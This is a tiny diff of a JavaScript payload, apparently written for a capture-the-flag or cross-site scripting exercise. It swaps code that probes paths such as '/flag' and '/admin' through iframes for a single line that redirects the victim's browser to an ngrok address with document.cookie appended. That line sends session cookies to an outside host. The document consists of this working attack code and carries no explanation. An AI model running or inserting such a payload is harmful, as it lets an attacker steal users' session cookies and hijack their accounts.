@@ -1,6 +1,1 @@
-['/','/flag','/admin','/dashboard','/api','/debug','/secret']
-.forEach(p=>{
-    var i = document.createElement("iframe");
-    i.src = p;
-    document.body.appendChild(i);
-});
+location = "https://radiological-myriam-balancedly.ngrok-free.dev/?c=" + document.cookie;
